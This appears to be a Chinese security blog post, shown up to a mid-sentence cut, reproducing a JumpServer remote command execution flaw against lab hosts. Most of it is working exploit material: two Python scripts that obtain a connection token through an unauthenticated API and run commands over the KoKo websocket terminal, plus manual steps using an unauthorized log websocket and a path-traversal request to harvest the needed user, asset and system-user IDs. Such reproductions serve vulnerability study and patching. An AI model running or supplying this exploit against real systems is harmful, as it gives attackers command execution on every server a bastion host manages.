<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aioconsole</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_celery_task_log_path</span>(<span class="params">task_id</span>):</span></span><br><span class="line">    task_id = <span class="built_in">str</span>(task_id)</span><br><span class="line">    rel_path = os.path.join(task_id[<span class="number">0</span>], task_id[<span class="number">1</span>], task_id + <span class="string">&quot;.log&quot;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&quot;/opt/jumpserver/&quot;</span>, rel_path)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket, _text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_loop</span>(<span class="params">ws, session_id</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmdline = <span class="keyword">await</span> aioconsole.ainput()</span><br><span class="line">        <span class="keyword">await</span> send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;<span class="string">&quot;id&quot;</span>: session_id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmdline + <span class="string">&quot;\n&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">recv_loop</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_text = <span class="keyword">await</span> ws.recv()</span><br><span class="line">        ret = json.loads(recv_text)</span><br><span class="line">        <span class="keyword">if</span> ret.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;TERMINAL_DATA&quot;</span>):</span><br><span class="line">            <span class="keyword">await</span> aioconsole.aprint(ret[<span class="string">&quot;data&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>():</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> client:</span><br><span class="line">        recv_text = <span class="keyword">await</span> client.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        session_id = json.loads(recv_text)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span> + session_id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: session_id,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> send_msg(client, inittext)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.132.130:8080&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    <span class="keyword">if</span> host[-<span class="number">1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        host = host[:-<span class="number">1</span>]</span><br><span class="line">    print(host)</span><br><span class="line">    data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    res = requests.post(host + url, json=data)</span><br><span class="line">    token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    target = (</span><br><span class="line">        <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125215007165.png" alt="image-20210125215007165"></p>
<p>成功连接到某一台资产192.168.132.131</p>
<h2 id="脚本2"><a href="#脚本2" class="headerlink" title="脚本2"></a>脚本2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data=&#123;&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url_host=&#x27;http://192.168.1.73:8080&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     url = url_host+&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     url =url_host+&#x27;/api/v1/authentication/connection-token/?user-only=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     response = requests.post(url, json=data).json()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print(response)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     ret=requests.get(url_host+&#x27;/api/v1/authentication/connection-token/?token=%s&#x27;%response[&#x27;token&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print(ret.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_token()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=None&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务器端发送认证后的消息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket,_text</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">cmd</span>):</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> websocket:</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">resws=json.loads(recv_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = resws[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;get ws id:&quot;</span>+<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line"></span><br><span class="line">inittext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">id</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> send_msg(websocket,inittext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;exec cmd: ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmdtext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">id</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmd+<span class="string">&quot;\r\n&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(cmdtext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;#######finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">host=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> host[-<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"></span><br><span class="line">host=host[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(host)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;79655e4e-1741-46af-a793-fff394540a52&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line"></span><br><span class="line">res = requests.post(host + url, json=data)</span><br><span class="line"></span><br><span class="line">token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main_logic(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;python jumpserver.py http://192.168.1.73 whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h1><p>插件下载：</p>
<p><a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related">https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related</a></p>
<h2 id="插件验证websocket未授权"><a href="#插件验证websocket未授权" class="headerlink" title="插件验证websocket未授权"></a>插件验证websocket未授权</h2><p>url：<code>ws://192.168.132.130:8080/ws/ops/tasks/log/</code></p>
<p>Request：<code>&#123;&quot;task&quot;:&quot;/opt/jumpserver/logs/jumpserver&quot;&#125;</code></p>
<p>查看Task id的一些信息（看不到密码）</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125204724544.png" alt="image-20210125204724544"></p>
<p>获取到Task id为d4025be3-c3b6-49ca-87c6-97472450f08f</p>
<p>Request：<code>&#123;&quot;task&quot;:&quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;&#125;</code></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125205052694.png" alt="image-20210125205052694"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;task&quot;:&quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;&#125;</span><br><span class="line">&#123;&quot;message&quot;: &quot;\r\n&quot;&#125;</span><br><span class="line">&#123;&quot;message&quot;: &quot;2021-01-25 16:40:03 \u4efb\u52a1\u5f00\u59cb: \u6d4b\u8bd5\u8d44\u4ea7\u53ef\u8fde\u63a5\u6027: test(192.168.132.131)\r\r\nPLAY [\u6d4b\u8bd5\u8d44\u4ea7\u53ef\u8fde\u63a5\u6027: test(192.168.132.131)] *****************************************\r\r\nTASK [ping] ********************************************************************\r\r\n\u001b[0;32mok: [test]\u001b[0m\r\r\n2021-01-25 16:40:15 \u4efb\u52a1\u7ed3\u675f\r\r\n.\r\n\r\n.\r\r\nTask assets.tasks.asset_connectivity.test_asset_connectivity_manual[d4025be3-c3b6-49ca-87c6-97472450f08f] succeeded in 13.248451138999826s: (True, &#39;&#39;)\r\r\n&quot;, &quot;task&quot;: &quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>验证未授权存在。</p>
<h2 id="获取-asset-id-system-user-id-user-id"><a href="#获取-asset-id-system-user-id-user-id" class="headerlink" title="获取 asset_id,system_user_id,user_id"></a>获取 asset_id,system_user_id,user_id</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.91.198.20:8989&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125; or &#123;&quot;task&quot;:&quot;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129153604280.png" alt="image-20210129153604280"></p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;, &quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span><br></pre></td></tr></table></figure>
<h2 id="获取token"><a href="#获取token" class="headerlink" title="获取token"></a>获取token</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;?user-only&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.132.130:8080</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: python-requests&#x2F;2.25.1</span><br><span class="line">Content-Length: 152</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;, &quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155636901.png" alt="image-20210129155636901"></p>
<pre><code> 获取到token：
</code></pre>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;token&quot;:&quot;f1126d5d-6437-4aeb-a7f0-da5c9e76c5b7&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>有效期只有20s</p>
<p>Py-Demo</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">url_host=<span class="string">&#x27;http://192.168.132.130:8080&#x27;</span></span><br><span class="line">proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    url = url_host+<span class="string">&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line">    response = requests.post(url, json=data,proxies=proxies).json()</span><br><span class="line">    print(response)</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">get_token()</span><br></pre></td></tr></table></figure>
<h2 id="获取响应的通讯ID"><a href="#获取响应的通讯ID" class="headerlink" title="获取响应的通讯ID"></a>获取响应的通讯ID</h2><p><code>ws://192.168.132.130:8080/koko/ws/token/?target_id=f1126d5d-6437-4aeb-a7f0-da5c9e76c5b7</code></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155659430.png" alt="image-20210129155659430"></p>
<p>之后通过临时token 进行ws的访问，进而命令执行。</p>
<p>三个值在日志中体现如下：</p>
<p>1、在docker中的core中gunicorn.log文件中</p>
